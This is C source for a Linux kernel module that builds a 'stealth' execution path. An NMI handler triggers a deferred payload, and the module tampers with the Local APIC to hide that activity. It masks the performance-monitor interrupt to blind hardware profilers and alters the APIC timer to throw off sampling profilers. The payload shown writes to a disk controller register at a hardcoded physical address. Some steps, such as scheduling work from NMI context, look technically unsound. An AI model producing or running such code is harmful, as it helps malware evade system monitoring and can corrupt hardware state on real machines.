#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/io.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <asm/cacheflush.h>
#include <asm/nmi.h>

#define LAPIC_BASE_PHYS          0xFEE00000ULL
#define LAPIC_ID_REG             0x0020
#define LAPIC_LVT_PERF           0x0340
#define LAPIC_TIMER_INIT         0x0380
#define LAPIC_TIMER_CURR         0x0390
#define LAPIC_ICR_LOW            0x0300
#define LAPIC_ICR_HIGH           0x0310

#define VBOX_AHCI_FALLBACK_PHYS  0xe1900000ULL
#define INTEL_AHCI_SCRATCH_OFF   0xA0

static void __iomem *cached_lapic_base = NULL;

/* Forward declaration of the deferred payload work */
static void execute_stealth_payload(struct tasklet_struct *t);
DECLARE_TASKLET(stealth_payload_tasklet, execute_stealth_payload);

/*
 * 1. Ultra-Lightweight NMI Handler (Runs in hard NMI context)
 */
static int stealth_nmi_handler(unsigned int cmd, struct pt_regs *regs)
{
    tasklet_schedule(&stealth_payload_tasklet);
    return NMI_HANDLED;
}

/*
 * 2. Subsystem Initialization
 */
int __init init_apic_stealth_subsystem(void)
{
    u32 perf_val, init_count;
    int ret;

    if (cached_lapic_base)
        return 0;

    pr_info("[STEALTH_APIC] [*] Persistently mapping Local APIC physical frame @ 0x%llx\n", LAPIC_BASE_PHYS);
    cached_lapic_base = ioremap(LAPIC_BASE_PHYS, PAGE_SIZE);
    if (!cached_lapic_base) {
        pr_err("[STEALTH_APIC] [-] CRITICAL: Failed to persistently map LAPIC physical address space\n");
        return -ENOMEM;
    }

    ret = register_nmi_handler(NMI_LOCAL, stealth_nmi_handler, 0, "stealth_nmi_owner");
    if (ret) {
        pr_err("[STEALTH_APIC] [-] Failed to register persistent NMI handler: %d\n", ret);
        iounmap(cached_lapic_base);
        cached_lapic_base = NULL;
        return ret;
    }

    /* Force-mask LVT Performance Monitor (bit 16) to blind hardware profilers */
    perf_val = readl(cached_lapic_base + LAPIC_LVT_PERF);
    perf_val |= (1 << 16);
    writel(perf_val, cached_lapic_base + LAPIC_LVT_PERF);
    wmb();
    
    pr_info("[STEALTH_APIC] [+] PASS: LVT Performance Monitor pre-masked (Val: 0x%08x)\n", perf_val);

    /* Micro-mutate the APIC timer reload value to desynchronize sampling profilers */
    init_count = readl(cached_lapic_base + LAPIC_TIMER_INIT);
    if (init_count > 0) {
        u32 stolen_count = init_count ^ 0x10;
        writel(stolen_count, cached_lapic_base + LAPIC_TIMER_INIT);
        pr_info("[STEALTH_APIC] [+] PASS: APIC Timer interval mutated: 0x%08x -> 0x%08x\n", init_count, stolen_count);
    }

    return 0;
}

void cleanup_apic_stealth_subsystem(void)
{
    unregister_nmi_handler(NMI_LOCAL, "stealth_nmi_owner");
    tasklet_kill(&stealth_payload_tasklet);

    if (cached_lapic_base) {
        pr_info("[STEALTH_APIC] [*] Unmapping persistent Local APIC handle\n");
        iounmap(cached_lapic_base);
        cached_lapic_base = NULL;
    }
}

void stealth_sanitize_and_flush(void *addr, size_t size)
{
    u32 tick_before, tick_after, tick_delta;

    if (!addr || size == 0)
        return;

    if (!cached_lapic_base) {
        memzero_explicit(addr, size);
        clflush_cache_range(addr, size);
        return;
    }

    tick_before = readl(cached_lapic_base + LAPIC_TIMER_CURR);
    memzero_explicit(addr, size);
    clflush_cache_range(addr, size);
    tick_after = readl(cached_lapic_base + LAPIC_TIMER_CURR);
    tick_delta = (tick_before > tick_after) ? (tick_before - tick_after) : 0;

    pr_info("[STEALTH_APIC] [+] PASS: Sanitization finished. Tick Delta: 0x%08x\n", tick_delta);
}

/*
 * 3. Deferred Payload Execution (Runs in Safe Tasklet Context)
 */
static void execute_stealth_payload(struct tasklet_struct *t)
{
    void __iomem *abar_base;
    u32 scratch_orig, scratch_test;
    u8 dummy_buffer[256];

    pr_info("[STEALTH_APIC] [*] Executing payload in safe deferred context...\n");

    abar_base = ioremap(VBOX_AHCI_FALLBACK_PHYS, 0x1000);
    if (!abar_base) {
        pr_err("[STEALTH_APIC] [-] Failed to map ABAR space\n");
        return;
    }

    scratch_orig = readl(abar_base + INTEL_AHCI_SCRATCH_OFF);
    writel(scratch_orig ^ 0x5A5A5A5A, abar_base + INTEL_AHCI_SCRATCH_OFF);
    scratch_test = readl(abar_base + INTEL_AHCI_SCRATCH_OFF);
    writel(scratch_orig, abar_base + INTEL_AHCI_SCRATCH_OFF);

    pr_info("[STEALTH_APIC] [+] PASS: AHCI MMIO Scratchpad Verified (State: 0x%08x)\n", scratch_test);

    stealth_sanitize_and_flush(dummy_buffer, sizeof(dummy_buffer));

    iounmap(abar_base);
}

/*
 * 4. Programmatic NMI Trigger Engine
 */
void trigger_nmi_execution(void)
{
    u32 lapic_id;

    if (!cached_lapic_base)
        return;

    lapic_id = readl(cached_lapic_base + LAPIC_ID_REG);
    pr_info("[STEALTH_APIC] [*] Firing asynchronous NMI vector to target Core (APIC ID: 0x%08x)...\n", lapic_id);

    writel(lapic_id << 24, cached_lapic_base + LAPIC_ICR_HIGH);
    writel(0x00004400, cached_lapic_base + LAPIC_ICR_LOW);
    wmb();
}